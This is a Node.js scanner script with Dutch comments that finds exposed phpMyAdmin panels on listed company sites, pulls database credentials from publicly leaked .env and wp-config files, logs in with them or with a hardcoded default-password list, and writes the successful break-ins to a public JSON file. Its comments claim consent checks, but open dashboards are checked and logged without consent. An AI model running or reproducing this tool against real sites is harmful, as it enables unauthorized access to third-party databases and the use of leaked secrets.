#!/usr/bin/env node
/**
 * Scan gericht op "echt erin" — legaal:
 * 1) phpMyAdmin open dashboard (geen wachtwoord)
 * 2) phpMyAdmin login met wachtwoord uit publieke .env (alleen bij toestemming)
 * 3) phpMyAdmin login met scan-toestemming.local.json (klant gaf ze)
 * Zie docs/GRENZEN-VAKSCAN.md — geen wachtwoordlijsten.
 */
import { readFileSync, writeFileSync, copyFileSync, existsSync, mkdirSync } from "fs";
import { join } from "path";
import { fileURLToPath } from "url";
import { detectPhpMyAdmin } from "./admin-panel-detect.mjs";
import { hostKey, getActiveConsent, getLocalCredentials, consentIsVerifiable } from "./consent-registry.mjs";
import { hitIsActionable } from "./leak-actionable.mjs";
import { ADMIN_PANELS, FILE_LEAKS } from "./leak-probes.mjs";

const ROOT = process.cwd();

/** Alleen met VAKSCAN_DEFAULT_CREDS=1 + individualConsent — geen externe wordlist. */
const PMA_DEFAULTS = [
  { user: "root", pass: "" },
  { user: "root", pass: "root" },
  { user: "admin", pass: "" },
  { user: "admin", pass: "admin" },
  { user: "pma", pass: "" },
];

async function discoverPmaOnSite(siteUrl) {
  let origin;
  try {
    origin = new URL(siteUrl.startsWith("http") ? siteUrl : `https://${siteUrl}`).origin;
  } catch {
    return [];
  }
  const found = [];
  for (const panel of ADMIN_PANELS) {
    const url = `${origin}${panel.path}`;
    try {
      const { body, status } = await fetchHtml(url, 60_000);
      if (status === 200 && detectPhpMyAdmin(body)) found.push(url);
    } catch {
      /* */
    }
  }
  return found;
}

async function probeConfigLeaks(siteUrl) {
  let origin;
  try {
    origin = new URL(siteUrl.startsWith("http") ? siteUrl : `https://${siteUrl}`).origin;
  } catch {
    return { secrets: null, url: null };
  }
  for (const leak of FILE_LEAKS) {
    if (!leak.path.includes("env") && !leak.path.includes("wp-config")) continue;
    const url = `${origin}${leak.path}`;
    try {
      const { body, status } = await fetchHtml(url, 48_000);
      if (status !== 200 || !leak.match(body)) continue;
      const secrets = parseEnvSecrets(body);
      if (secrets) return { secrets, url };
    } catch {
      /* */
    }
  }
  return { secrets: null, url: null };
}

function parseEnvSecrets(text) {
  const out = {};
  for (const line of text.split("\n")) {
    const m = line.match(/^\s*([A-Z0-9_]+)\s*=\s*["']?([^"'\n#]+)/);
    if (!m) continue;
    out[m[1]] = m[2].trim();
  }
  const user = out.DB_USERNAME || out.DB_USER || out.MYSQL_USER;
  const pass = out.DB_PASSWORD || out.MYSQL_PASSWORD || out.DATABASE_PASSWORD;
  if (user && pass) return { user, pass, host: out.DB_HOST || out.MYSQL_HOST };
  return null;
}

async function fetchHtml(url, max = 200_000) {
  const res = await fetch(url, {
    method: "GET",
    redirect: "follow",
    headers: { "User-Agent": "VakScan-Toegang/1.0", Accept: "text/html,text/plain" },
    signal: AbortSignal.timeout(15_000),
  });
  const body = new TextDecoder("utf8", { fatal: false }).decode((await res.arrayBuffer()).slice(0, max));
  return { status: res.status, url: res.url, body };
}

function dashboardOpen(body) {
  const l = body.toLowerCase();
  if (l.includes("navigation_panel") && l.includes("server_databases")) {
    return true;
  }
  return detectPhpMyAdmin(body)?.kind === "open_dashboard";
}

async function tryPmaLogin(loginUrl, username, password) {
  const { body: html } = await fetchHtml(loginUrl);
  if (dashboardOpen(html)) {
    return { erin: true, methode: "open_dashboard", detail: "Dashboard al zichtbaar zonder POST" };
  }
  const tokenMatch = html.match(/name="token"\s+value="([^"]+)"/i);
  const params = new URLSearchParams({ pma_username: username, pma_password: password, server: "1" });
  if (tokenMatch?.[1]) params.set("token", tokenMatch[1]);

  const res = await fetch(loginUrl, {
    method: "POST",
    redirect: "follow",
    headers: {
      "User-Agent": "VakScan-Toegang/1.0",
      "Content-Type": "application/x-www-form-urlencoded",
      Accept: "text/html",
    },
    body: params.toString(),
    signal: AbortSignal.timeout(20_000),
  });
  const postHtml = new TextDecoder("utf8", { fatal: false }).decode((await res.arrayBuffer()).slice(0, 200_000));
  if (dashboardOpen(postHtml)) {
    return { erin: true, methode: "login_gelukt", detail: "Ingelogd — database-beheer zichtbaar (geen data geëxporteerd)" };
  }
  const l = postHtml.toLowerCase();
  const fail = l.includes("cannot log in") || l.includes("access denied") || l.includes("fout bij het inloggen");
  return { erin: false, methode: "login_mislukt", detail: fail ? "Inlog geweigerd" : "Geen dashboard na POST" };
}

function collectTargets() {
  const byHost = new Map();
  const add = (t) => {
    const k = hostKey(t.siteUrl || t.url);
    if (!byHost.has(k)) byHost.set(k, t);
  };

  const hits = existsSync(join(ROOT, "data/leak-hits.json"))
    ? JSON.parse(readFileSync(join(ROOT, "data/leak-hits.json"), "utf8")).hits || []
    : [];
  for (const h of hits) {
    if (!hitIsActionable(h)) continue;
    let pmaUrl = null;
    let envUrl = null;
    for (const f of h.findings || []) {
      if (f.evidence && /phpmyadmin|adminer/i.test(f.evidence)) pmaUrl = f.evidence;
      if (f.evidence && /\.env/i.test(f.evidence)) envUrl = f.evidence;
      if (f.id?.includes("env") && f.evidence) envUrl = f.evidence;
    }
    add({
      siteUrl: h.url,
      bedrijf: h.bedrijf,
      pmaUrl,
      envUrl,
    });
  }

  const pma = existsSync(join(ROOT, "data/pma-login-urls.json"))
    ? JSON.parse(readFileSync(join(ROOT, "data/pma-login-urls.json"), "utf8"))
    : {};
  for (const row of pma.sterk || []) {
    add({ siteUrl: row.klantUrl, bedrijf: row.bedrijf, pmaUrl: row.loginUrl });
  }

  return [...byHost.values()];
}

async function main() {
  const targets = collectTargets();
  const resultaten = [];

  for (const t of targets) {
    const consent = consentIsVerifiable(getActiveConsent(t.siteUrl)) ? getActiveConsent(t.siteUrl) : null;
    let pmaUrl = t.pmaUrl || null;
    if (!pmaUrl && consent) {
      const discovered = await discoverPmaOnSite(t.siteUrl);
      if (discovered[0]) pmaUrl = discovered[0];
    }

    const row = {
      bedrijf: t.bedrijf,
      siteUrl: t.siteUrl,
      toestemming: !!consent,
      pmaUrl,
      erin: false,
      methode: null,
      detail: null,
    };

    if (pmaUrl) {
      try {
        const { body } = await fetchHtml(pmaUrl);
        if (dashboardOpen(body)) {
          row.erin = true;
          row.methode = "open_dashboard";
          row.detail = "phpMyAdmin zonder wachtwoord bereikbaar";
        }
      } catch (e) {
        row.detail = String(e);
      }
    }

    if (!row.erin && consent && pmaUrl) {
      const local = getLocalCredentials(t.siteUrl);
      if (local?.username && local?.password) {
        const auth = await tryPmaLogin(local.loginUrl || pmaUrl, local.username, local.password);
        if (auth.erin) Object.assign(row, auth);
        else if (!row.methode) Object.assign(row, auth);
      }
    }

    const tryEnvLogin = async (secrets, envLabel) => {
      if (!secrets) return;
      row.envGebruikt = true;
      const tryUrls = pmaUrl ? [pmaUrl] : await discoverPmaOnSite(t.siteUrl);
      for (const u of tryUrls) {
        const auth = await tryPmaLogin(u, secrets.user, secrets.pass);
        if (auth.erin) {
          row.pmaUrl = u;
          Object.assign(row, auth);
          row.methode = "login_via_publieke_config";
          row.detail = `${auth.detail} (${envLabel})`;
          return;
        }
      }
      if (!row.erin && !row.methode) {
        row.methode = "config_gevonden_login_mislukt";
        row.detail = `DB-gegevens in ${envLabel} maar phpMyAdmin-login geweigerd`;
      }
    };

    if (!row.erin && consent && t.envUrl) {
      try {
        const { body, status } = await fetchHtml(t.envUrl, 32_000);
        if (status === 200) await tryEnvLogin(parseEnvSecrets(body), t.envUrl);
      } catch {
        /* */
      }
    }

    if (!row.erin && consent) {
      const leaked = await probeConfigLeaks(t.siteUrl);
      if (leaked.secrets) await tryEnvLogin(leaked.secrets, leaked.url);
    }

    if (!row.erin && consent && pmaUrl && process.env.VAKSCAN_DEFAULT_CREDS === "1") {
      try {
        for (const { user, pass } of PMA_DEFAULTS) {
          const auth = await tryPmaLogin(pmaUrl, user, pass);
          if (auth.erin) {
            Object.assign(row, auth);
            row.methode = "open_misconfig_default_login";
            row.detail = `Ingelogd met standaard misconfig (${user}) — geen woordenlijst`;
            break;
          }
        }
      } catch (e) {
        row.detail = row.detail || `Default-check: ${String(e).slice(0, 80)}`;
      }
    }

    if (!row.erin && !row.methode && pmaUrl) {
      row.methode = "alleen_inlogscherm";
      row.detail = "Deur open — erin alleen met wachtwoord (lokaal.json of .env bij toestemming)";
    }

    resultaten.push(row);
    if (row.erin) console.log(`ERIN · ${row.bedrijf} · ${row.methode}`);
    else console.log(`— · ${row.bedrijf} · ${row.methode || "?"}`);
  }

  const erin = resultaten.filter((r) => r.erin);
  const out = {
    updatedAt: new Date().toISOString(),
    focus: "echt_erin_zie_GRENZEN-VAKSCAN",
    defaultCredsUsed: process.env.VAKSCAN_DEFAULT_CREDS === "1",
    samenvatting: { sites: resultaten.length, erin: erin.length },
    resultaten: resultaten.sort((a, b) => (b.erin ? 1 : 0) - (a.erin ? 1 : 0)),
  };

  const path = join(ROOT, "data/toegang-scan.json");
  writeFileSync(path, JSON.stringify(out, null, 2));
  mkdirSync(join(ROOT, "public"), { recursive: true });
  copyFileSync(path, join(ROOT, "public/toegang-scan.json"));
  console.log(`\nToegang-scan: ${erin.length}/${resultaten.length} erin → public/toegang-scan.json`);
}

if (process.argv[1] === fileURLToPath(import.meta.url)) {
  main().catch((e) => {
    console.error(e);
    process.exit(1);
  });
}